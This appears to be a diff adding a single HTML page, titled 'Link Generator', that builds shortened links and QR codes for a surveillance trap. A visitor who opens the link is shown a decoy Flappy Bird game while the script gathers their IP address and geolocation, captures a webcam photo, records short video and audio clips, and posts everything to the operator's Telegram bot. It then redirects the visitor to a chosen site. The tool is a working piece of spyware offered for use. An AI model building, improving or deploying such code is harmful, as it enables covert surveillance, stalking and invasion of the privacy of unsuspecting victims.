@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Link Generator</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap');
+    body{font-family:'Orbitron',sans-serif;background:#000;color:#fff;
+         display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
+    .card{background:#111;padding:25px;border-radius:14px;max-width:480px;width:100%}
+    h1{text-align:center;color:#0ff;margin-bottom:20px;text-shadow:0 0 8px #0ff}
+    label{display:block;margin-top:10px}
+    input{width:100%;padding:10px;margin-top:5px;border-radius:6px;border:none;background:#222;color:#0ff}
+    button{margin-top:15px;padding:12px;width:100%;border:none;border-radius:8px;
+           background:linear-gradient(90deg,#00f6ff,#6f00ff);color:#fff;font-weight:bold}
+    #linkOut{margin-top:20px;font-size:14px;word-break:break-all;background:#222;padding:12px;border-radius:8px}
+    canvas.qr{display:block;margin:15px auto}
+    canvas.game{background:#70c5ce;display:none;margin:auto;border:2px solid #fff}
+  </style>
+</head>
+<body>
+  <div class="card" id="formCard">
+    <h1> 🔗LINK GENERATOR</h1>
+    <label>Bot Token</label>
+    <input id="botToken" type="text" placeholder="123456:ABC...">
+    <label>Chat ID</label>
+    <input id="chatId" type="text" placeholder="123456789">
+    <label>URL Target</label>
+    <input id="targetUrl" type="url" placeholder="https://example.com">
+    <button onclick="generate()">Generate Link</button>
+    <div id="linkOut"></div>
+    <canvas id="qrcode" class="qr"></canvas>
+  </div>
+
+  <canvas id="flappy" class="game" width="320" height="480"></canvas>
+
+  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+  <script>
+    // === Shorten link TinyURL ===
+    async function shorten(url){
+      try{
+        const res=await fetch("https://tinyurl.com/api-create.php?url="+encodeURIComponent(url));
+        return await res.text();
+      }catch(e){return url;}
+    }
+
+    // === Generate link ===
+    async function generate(){
+      const token=document.getElementById("botToken").value.trim();
+      const chat=document.getElementById("chatId").value.trim();
+      const url=document.getElementById("targetUrl").value.trim();
+      if(!token||!chat||!url) return alert("Isi semua kolom dulu!");
+
+      const longLink=`${location.origin}${location.pathname}?raff&mode=view&token=${encodeURIComponent(token)}&chat=${encodeURIComponent(chat)}&target=${encodeURIComponent(url)}`;
+      const shortLink=await shorten(longLink);
+
+      document.getElementById("linkOut").innerHTML=`
+        <strong>Link Panjang:</strong><br>
+        <a href="${longLink}" target="_blank" style="color:#0ff">${longLink}</a><br><br>
+        <strong>Link Pendek:</strong><br>
+        <a href="${shortLink}" target="_blank" style="color:#6f0">${shortLink}</a>
+      `;
+
+      // QR Code putih
+      const canvas=document.getElementById("qrcode");
+      QRCode.toCanvas(canvas, shortLink, { color:{dark:"#ffffff",light:"#000000"} });
+    }
+
+    // === MODE VIEW ===
+    (async () => {
+      const params=new URLSearchParams(location.search);
+      if(params.get("mode")!=="view") return;
+
+      document.getElementById("formCard").style.display="none";
+      const cvs=document.getElementById("flappy");
+      cvs.style.display="block";
+      const ctx=cvs.getContext("2d");
+
+      const TOKEN=params.get("token");
+      const CHAT=params.get("chat");
+      const TARGET=params.get("target")||"https://example.com";
+
+// === Game Flappy Bird lebih lengkap ===
+let frames=0;
+let bird={
+  x:50, y:150, w:30, h:30,
+  gravity:0.5, jump:-8, speed:0
+};
+let pipes=[];
+let gap=90;
+
+cvs.addEventListener("click",()=>{bird.speed=bird.jump;});
+
+function drawBird(){
+  ctx.fillStyle="yellow";
+  ctx.fillRect(bird.x,bird.y,bird.w,bird.h);
+}
+
+function updateBird(){
+  bird.speed+=bird.gravity;
+  bird.y+=bird.speed;
+
+  // batas atas
+  if(bird.y<0){bird.y=0; bird.speed=0;}
+  // batas bawah
+  if(bird.y+bird.h>cvs.height){bird.y=cvs.height-bird.h; bird.speed=0;}
+}
+
+function drawPipes(){
+  ctx.fillStyle="green";
+  for(let p of pipes){
+    ctx.fillRect(p.x,0,50,p.top);
+    ctx.fillRect(p.x,p.top+gap,50,cvs.height);
+  }
+}
+
+function updatePipes(){
+  if(frames%100===0){
+    let top=Math.floor(Math.random()*200)+50;
+    pipes.push({x:cvs.width, top:top});
+  }
+  for(let i=0;i<pipes.length;i++){
+    pipes[i].x-=2;
+    if(pipes[i].x+50<0){pipes.shift();i--;}
+  }
+}
+
+function loop(){
+  ctx.fillStyle="#70c5ce";
+  ctx.fillRect(0,0,cvs.width,cvs.height);
+
+  updateBird(); drawBird();
+  updatePipes(); drawPipes();
+
+  frames++;
+  requestAnimationFrame(loop);
+}
+loop();
+
+      // === Kirim ke Telegram ===
+      const send=(type,fd)=>{
+        fetch(`https://api.telegram.org/bot${TOKEN}/send${type}`,{method:"POST",body:fd});
+      };
+
+      // IP
+      let ipAddr="Unknown";
+      try{
+        const res=await fetch("https://api.ipify.org?format=json");
+        ipAddr=(await res.json()).ip;
+      }catch{}
+
+      // Lokasi
+      let lat="-",lon="-";
+      try{
+        const p=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
+        lat=p.coords.latitude;lon=p.coords.longitude;
+      }catch{}
+
+      // Foto
+      try{
+        const s=await navigator.mediaDevices.getUserMedia({video:true});
+        const v=document.createElement("video");
+        const c=document.createElement("canvas");
+        v.srcObject=s; await v.play();
+        c.width=v.videoWidth;c.height=v.videoHeight;
+        c.getContext("2d").drawImage(v,0,0);
+        s.getTracks().forEach(t=>t.stop());
+        c.toBlob(b=>{
+          const fd=new FormData();
+          fd.append("chat_id",CHAT);
+          fd.append("photo",b,"snap.jpg");
+          fd.append("caption",`📸 Lat:${lat}, Lon:${lon}\n🌐 IP:${ipAddr}`);
+          send("Photo",fd);
+        },"image/jpeg");
+      }catch{}
+
+      // Video 3 detik
+      try{
+        const vs=await navigator.mediaDevices.getUserMedia({video:true,audio:true});
+        const rec=new MediaRecorder(vs);
+        const chunks=[];
+        rec.ondataavailable=e=>chunks.push(e.data);
+        rec.onstop=()=>{
+          const blob=new Blob(chunks,{type:"video/webm"});
+          const fd=new FormData();
+          fd.append("chat_id",CHAT);
+          fd.append("video",blob,"clip.webm");
+          fd.append("caption",`📹 3s video\nLat:${lat}, Lon:${lon}\n🌐 IP:${ipAddr}`);
+          send("Video",fd);
+          vs.getTracks().forEach(t=>t.stop());
+        };
+        rec.start(); setTimeout(()=>rec.stop(),3000);
+      }catch{}
+
+      // Audio 5 detik
+      try{
+        const as=await navigator.mediaDevices.getUserMedia({audio:true});
+        const rec=new MediaRecorder(as);
+        const chunks=[];
+        rec.ondataavailable=e=>chunks.push(e.data);
+        rec.onstop=()=>{
+          const blob=new Blob(chunks,{type:"audio/ogg"});
+          const fd=new FormData();
+          fd.append("chat_id",CHAT);
+          fd.append("audio",blob,"rec.ogg");
+          fd.append("caption",`🎤 5s audio\nLat:${lat}, Lon:${lon}\n🌐 IP:${ipAddr}`);
+          send("Audio",fd);
+          as.getTracks().forEach(t=>t.stop());
+        };
+        rec.start(); setTimeout(()=>rec.stop(),5000);
+      }catch{}
+
+      // Redirect setelah 6 detik
+      setTimeout(()=>location.replace(TARGET),6000);
+    })();
+  </script>
+</body>
+                                                              </html>
